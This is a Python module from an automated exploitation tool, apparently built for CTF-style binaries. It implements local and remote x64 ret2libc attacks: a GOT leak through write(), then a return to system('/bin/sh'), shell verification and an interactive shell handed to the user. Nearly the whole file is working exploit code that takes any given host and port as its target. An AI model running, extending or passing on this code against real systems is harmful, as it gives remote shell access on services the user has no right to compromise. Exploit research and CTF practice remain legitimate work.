"""P7.5: x64 ret2libc-write strategies (local + remote).

Replaces the v3.1 monolith's ``ret2libc_write_x64`` (L896-1024, local)
+ ``ret2libc_write_x64_remote`` (L1100+, remote) ad-hoc 2-stage
functions with two :class:`ExploitStrategy` subclasses.

x64 specifics
-------------
* Stage 1 needs **two** gadget pops: ``pop rdi; ret`` to load
  ``fd=1`` into RDI, then ``pop rsi; ret`` to load
  ``buf=write_got`` into RSI.  This is the x64 calling
  convention (RDI = 1st arg, RSI = 2nd arg).
* Stage 2 includes the ``ret`` alignment gadget (P6.4 fix;
  v3.1's x64 ret2libc_write **lacked** it).  The primitive
  P6.4 already adds the ``ret`` gadget to fix Ubuntu 18.04+
  glibc MOVAPS SIGSEGV.
* x64 write leak uses ``u64(io.recv(8))`` — 8 raw bytes
  (full libc address).

Per ``rebuild.md`` §6.8 P7.5 + ``refactor.md`` §3.2.2 + P6.4
primitive contract.

Defensive checks
----------------
* ``ctx.gadgets_x64.pop_rdi == 0`` or ``pop_rsi == 0`` →
  primitive returns ``b""`` → strategy returns ``False``
* ``ctx.remote is None`` (for remote strategies) → ``False``
* leak parse failure → ``False``
"""
from __future__ import annotations

import datetime

from autopwn.context import ExploitContext
from autopwn.core.logging import print_info, print_payload, print_section_header, print_success, print_warning
from autopwn.exp.base import ExploitStrategy
from autopwn.exp.priorities import RET2LIBC_WRITE
from autopwn.exp.registry import register
from autopwn.primitives.ret2libc_write import Ret2LibcWriteX64
from autopwn.report.model import ExploitInfo
from autopwn.core.shell_verify import verify_shell


# ---------------------------------------------------------------------------
# Local x64 strategy
# ---------------------------------------------------------------------------


@register
class Ret2LibcWriteX64LocalStrategy(ExploitStrategy):
    """Local 64-bit 2-stage ret2libc via ``write(1, write@GOT, 8)`` leak.

    Metadata (``requires_*``):
      * ``arch = 64``
      * ``remote = False``
      * ``requires = ("has_write",)``

    Priority ``RET2LIBC_WRITE = 110`` per 附录 A.

    Note: in v4.0 baseline (``logs/v4.0/level3_x64.log``),
    this strategy fires for ``level3_x64`` (the only
    Challenge/ binary with ``write`` in PLT but no ``system``/
    ``/bin/sh`` baked in) — it leaks libc ``write`` and
    computes system + /bin/sh from libc.
    """

    name = "ret2libc-write-x64"
    priority = RET2LIBC_WRITE
    requires_arch = 64
    requires_remote = False
    requires = ("has_write",)

    def run(self, ctx: ExploitContext) -> bool:
        """Execute the 64-bit 2-stage ret2libc locally."""
        from pwn import process, u64

        if ctx.gadgets_x64 is None or ctx.gadgets_x64.pop_rdi == 0 or ctx.gadgets_x64.pop_rsi == 0:
            print_info("ret2libc-write-x64: ctx.gadgets_x64 missing pop_rdi/pop_rsi; skipping")
            return False

        print_section_header("EXPLOITATION: ret2libc (write) - x64")
        print_payload("preparing ret2libc exploit using write function")

        primitive = Ret2LibcWriteX64()

        # Stage 1: leak.
        payload1 = primitive.build_payload(ctx)
        if not payload1:
            print_info("ret2libc-write-x64 stage1 primitive returned empty; skipping")
            return False

        io = process(str(ctx.binary.path))
        io.recv()
        io.sendline(payload1)
        print_payload("stage 1: leaking write address from GOT")

        try:
            write_addr = u64(io.recv(8))
        except Exception as e:
            print_info(f"ret2libc-write-x64 leak parse failed: {e}")
            return False
        print_success(f"write address leaked: {hex(write_addr)}")

        # Stage 2: return-to-system.
        payload2 = primitive.build_stage2_payload(ctx, write_addr)
        if not payload2:
            print_info("ret2libc-write-x64 stage2 primitive returned empty; skipping")
            return False

        io.sendline(payload2)
        print_payload("stage 2: executing system('/bin/sh')")

        info = ExploitInfo(
            exploit_type="ret2libc (write) - x64",
            payload=payload2,
            padding=ctx.padding,
            addresses={
                "write_addr": write_addr,
            },
            vulnerability_type="Stack Buffer Overflow",
            architecture="x64",
            target_binary=ctx.binary.path.name,
            timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )


        verify_ok, verify_output = verify_shell(io, keep_alive=True)
        from autopwn.core.shell_verify import record_success_verified
        ok = record_success_verified(info, verify_ok, verify_output, ctx)
        if not ok:
            print_warning(f"Ret2LibcWriteX64LocalStrategy: shell verification failed (no PWNED in shell output)")
            return False
        ctx.id_output = verify_output
        io.interactive()  # v4.0.4: drop user into shell; returns when user exits
        return True


# ---------------------------------------------------------------------------
# Remote x64 strategy
# ---------------------------------------------------------------------------


@register
class Ret2LibcWriteX64RemoteStrategy(ExploitStrategy):
    """Remote 64-bit 2-stage ret2libc via ``write(1, write@GOT, 8)`` leak.

    Mirror of :class:`Ret2LibcWriteX64LocalStrategy` for the
    ``ctx.mode == "remote"`` branch.  ``pwn.remote(host, port)``
    instead of ``pwn.process(path)``.
    """

    name = "ret2libc-write-x64-remote"
    priority = RET2LIBC_WRITE
    requires_arch = 64
    requires_remote = True
    requires = ("has_write",)

    def run(self, ctx: ExploitContext) -> bool:
        """Execute the 64-bit 2-stage ret2libc against a remote service."""
        from pwn import remote, u64

        if ctx.remote is None:
            print_info("ret2libc-write-x64-remote: ctx.remote is None; skipping")
            return False
        host, port = ctx.remote

        if ctx.gadgets_x64 is None or ctx.gadgets_x64.pop_rdi == 0 or ctx.gadgets_x64.pop_rsi == 0:
            print_info("ret2libc-write-x64-remote: ctx.gadgets_x64 missing pop_rdi/pop_rsi; skipping")
            return False

        print_section_header("EXPLOITATION: ret2libc (write) - x64 Remote")
        print_payload("preparing remote ret2libc exploit using write function")

        primitive = Ret2LibcWriteX64()

        payload1 = primitive.build_payload(ctx)
        if not payload1:
            print_info("ret2libc-write-x64-remote stage1 primitive returned empty; skipping")
            return False

        io = remote(host, port)
        io.recv()
        io.sendline(payload1)
        print_payload("stage 1: leaking write address from GOT")

        try:
            write_addr = u64(io.recv(8))
        except Exception as e:
            print_info(f"ret2libc-write-x64-remote leak parse failed: {e}")
            return False
        print_success(f"write address leaked: {hex(write_addr)}")

        payload2 = primitive.build_stage2_payload(ctx, write_addr)
        if not payload2:
            return False

        io.sendline(payload2)
        print_payload("stage 2: executing system('/bin/sh')")

        info = ExploitInfo(
            exploit_type="ret2libc (write) - x64 Remote",
            payload=payload2,
            padding=ctx.padding,
            addresses={
                "write_addr": write_addr,
            },
            vulnerability_type="Stack Buffer Overflow",
            architecture="x64",
            target_binary=ctx.binary.path.name,
            timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )


        verify_ok, verify_output = verify_shell(io, keep_alive=True)
        from autopwn.core.shell_verify import record_success_verified
        ok = record_success_verified(info, verify_ok, verify_output, ctx)
        if not ok:
            print_warning(f"Ret2LibcWriteX64LocalStrategy: shell verification failed (no PWNED in shell output)")
            return False
        ctx.id_output = verify_output
        io.interactive()  # v4.0.4: drop user into shell; returns when user exits
        return True


__all__ = [
    "Ret2LibcWriteX64LocalStrategy",
    "Ret2LibcWriteX64RemoteStrategy",
]
